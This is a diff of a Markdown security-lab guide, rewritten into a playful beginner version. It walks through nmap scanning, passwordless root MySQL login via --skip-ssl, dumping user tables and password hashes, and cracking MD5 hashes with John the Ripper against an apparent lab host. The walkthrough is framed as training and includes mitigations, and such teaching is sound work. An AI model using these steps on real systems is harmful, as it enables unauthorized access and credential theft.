@@ -1,169 +1,189 @@
-### 🧪 ** 1: Service Enumeration & Initial Access**
-
-**🎯 Goal:** Find and connect to the database on the target machine.
-
-#### 🔧 Tools:
-- `nmap`
-- `telnet` or `nc`
-- `mysql` / `psql` (based on DB type)
-
-#### ✅ Steps:
-```bash
-nmap -sV -p- TARGET_IP
-```
-- Look for ports like `3306` (MySQL), `5432` (PostgreSQL), etc.
-
-![alt text](image.png)
-
-#### 🔗 Initial Access Attempt
-#### 🧪 Attempt 1: Standard MySQL connection with password
-```bash
-mysql -h 192.168.153.140 -u root -p
-```
-**Result:**
-```
-ERROR 2026 (HY000): TLS/SSL error: wrong version number
-```
-![alt text](image-1.png)
-
-#### 🧪 Attempt 2: Retry with different flags
-```bash
-mysql -h 192.168.153.140 -P 3306 -u root --ssl-mode=DISABLED
-```
-**Result:**
-```
-mysql: unknown variable 'ssl-mode=DISABLED'
-```
-![alt text](image-2.png)
-
-#### 🧪 Attempt 3: Successfully connected by skipping SSL
-```bash
-mysql -h 192.168.153.140 -P 3306 -u root --password= --skip-ssl
-```
-
-✅ **Success!** Connected to the MySQL service:
-```
-Welcome to the MariaDB monitor...
-Server version: 5.0.51a-3ubuntu5 (Ubuntu)
-```
-![alt text](image-3.png)
-
-### 🧠 Explanation:
-
-- The **MySQL client tried to use TLS/SSL by default**, but the **server did not support it** or was using an **older version (MySQL 5.0.51a)** incompatible with the client's TLS version.
-- Using the `--skip-ssl` flag **disabled SSL negotiation**, which allowed the connection to succeed.
-- The **client `ssl-mode` option** is not recognized by this older version of `mysql` on Kali. Instead, `--skip-ssl` worked.
+# 🎓 **Lab 2 — Beginner Edition: Hack the Database Like a Pro (Safely!)**
 
 ---
 
-### ✅ Post-Connection Verification
+## 🧰 TOOLS YOU'LL USE (Imagine these are your hacking toys 🧸)
+
+| Tool               | What it does (like a toy's power!)               |
+|--------------------|--------------------------------------------------|
+| **Kali Linux**     | Your hacker playground (like a superhero HQ)    |
+| **nmap**           | Scans other computers to see open doors 🏠🔍     |
+| **mysql-client**   | A way to talk to the database like a chat app 💬 |
+| **hashid**         | Tells you what kind of password hash it is 🔍    |
+| **John the Ripper**| Cracks passwords (like solving secret codes 🧠) |
+
+---
+
+# ✅ PART 1: Find & Open the Secret Door (aka connect to MySQL)
+
+---
+
+### 🥽 1.1 Find Which Doors Are Open  
+**🧠 GOAL:** Look at the victim machine and see which service (door) is open.
+
+```bash
+nmap -sV [target-ip]
+```
+
+Replace `[target-ip]` with the real IP of the target (e.g., `192.168.153.140`).
+
+**What you’re looking for:**  
+Look for a line that says:
+
+```
+3306/tcp open  mysql
+```
+
+👉 Means **MySQL is running** on port 3306.
+
+---
+
+### 🧪 1.2 Try to Login to Database  
+Use:
+
+```bash
+mysql -h [target-ip] -u root -p
+```
+
+If it asks for a password and **fails**, try this instead:
+
+```bash
+mysql -h [target-ip] -P 3306 -u root --password= --skip-ssl
+```
+
+✅ If it works, you'll see:
+```
+Welcome to the MariaDB monitor...
+```
+
+📢 **Why this is bad (from security view)**:  
+You connected **without any password**! That’s like entering someone’s house because the door wasn’t locked. 🚪🔓
+
+---
+
+# ✅ PART 2: Explore the Database World 🌍
+
+---
+
+### 📚 2.1 See What Databases Exist
+
+In the MariaDB monitor, type:
+
 ```sql
 SHOW DATABASES;
 ```
 
-**Result:**
-```
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| dvwa               |
-| metasploit         |
-| mysql              |
-| owasp10            |
-| tikiwiki           |
-| tikiwiki195        |
-+--------------------+
-```
-
-✅ Successfully listed databases — confirmed access.
-
-![alt text](image-4.png)
+Look for ones like `dvwa`, `mysql`, `metasploit`.
 
 ---
 
-### 🔹 **2. Enumeration of Users and Authentication Weaknesses**
+### 📂 2.2 Pick a Database to Explore
 
-**Goal:** Find DB users and check if any have poor credentials or no password.
-
-#### ✅ Steps:
-Inside MySQL or PostgreSQL:
-```sql
-SELECT user, password FROM mysql.user;  -- MySQL
-SELECT usename, passwd FROM pg_shadow;  -- PostgreSQL
-```
-![alt text](image-5.png)
-
-
-#### 📌 Reflection Question:
-> Is accessing a DB with no password a cryptographic failure?
-
-**Answer Example:**
-Yes, it is. It shows a failure to enforce secure authentication, and violates the principle of cryptographic confidentiality and identity verification.
-
----
-
-### 🔹 **3. Password Hash Discovery and Identification**
-
-**Goal:** Find hashes and identify their type.
-
-#### ✅ Steps:
-Search tables like `users`, `accounts`, or `credentials`.
+Choose one like `dvwa`:
 
 ```sql
-SELECT username, password FROM users;
+USE dvwa;
 ```
-
-Use tools to identify hash type:
-```bash
-hashid hash_here
-hash-identifier
-```
-
-#### 📌 Question:
-> What cryptographic weaknesses exist in this method?
-
-**Example Answer:**
-If hashes use MD5 or SHA1, they're vulnerable due to:
-- Fast computation (easy to brute-force)
-- Known collisions
-- Lack of salting
 
 ---
 
-### 🔹 **4. Offline Hash Cracking**
+### 📄 2.3 See What’s Inside
 
-**Goal:** Crack discovered hashes using `john` or `hashcat`.
-
-#### ✅ Example with John:
-```bash
-echo 'admin:$1$abc$1234567890abcdef' > hash.txt
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```sql
+SHOW TABLES;
 ```
 
-Or with Hashcat:
-```bash
-hashcat -m 0 hash.txt rockyou.txt  # -m 0 = MD5
+You'll see tables like:
+```
+guestbook
+users
 ```
 
-#### 🔍 Analyze:
-- Which passwords cracked?
-- Were they weak/simple?
-- Any reused passwords?
+Let’s look inside the `users` table:
+
+```sql
+SELECT * FROM users;
+```
+
+You’ll get usernames and **weird password-looking strings** like:
+```
+5f4dcc3b5aa765d61d8327deb882cf99
+```
 
 ---
 
-### 🔹 **5. Cryptographic Analysis and Mitigation**
+# ✅ PART 3: Crack the Password Code 🧠🔐
 
-Summarize key issues found:
-| Category                | Problem                          | Suggested Fix                        |
-|------------------------|----------------------------------|--------------------------------------|
-| Auth Flaw              | No/weak password enforcement     | Enforce strong passwords, MFA        |
-| Weak Hashing           | Use of MD5                       | Use bcrypt, scrypt, Argon2           |
-| Data in Transit        | Credentials in plaintext         | Enforce TLS/SSL                      |
+---
 
-#### Optional Wireshark Check:
-```bash
-wireshark &
-# Apply filter: mysql || postgres || tcp.port == DB_PORT
+### 🧠 3.1 Figure Out What Kind of Password It Is
+
+Copy one of the hashes. Example:
 ```
+5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+Then in Kali terminal:
+
+```bash
+hashid 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+It will say something like:
+```
+[+] MD5
+```
+
+So this hash is using **MD5**.
+
+---
+
+### 🧨 3.2 Crack It Like a Puzzle Piece
+
+Save the hash in a file:
+
+```bash
+echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
+```
+
+Now crack it with:
+
+```bash
+john hash.txt --format=raw-md5
+```
+
+Wait a bit... you’ll see:
+
+```
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password         (?)
+```
+
+✅ You cracked it! The password is: `password` 😱  
+(Yes, people really use dumb passwords like this.)
+
+---
+
+# 🧾 What You Should Record in Report
+
+| Step | What to show |
+|------|--------------|
+| Nmap scan | Screenshot of port 3306 open |
+| MySQL connection | Screenshot of successful login (with/without password) |
+| Databases/tables | Show what’s inside (users + passwords) |
+| Hashes | Show the hash + what tool detected |
+| Cracked Password | Show result from John the Ripper |
+
+---
+
+# 🎉 FINAL THOUGHT
+
+You just:
+- Found an open database
+- Got inside without a password
+- Read users’ info
+- Cracked a hashed password
+
+This is EXACTLY what real hackers do — which is why learning this helps you **defend against it** in real life. 🛡️
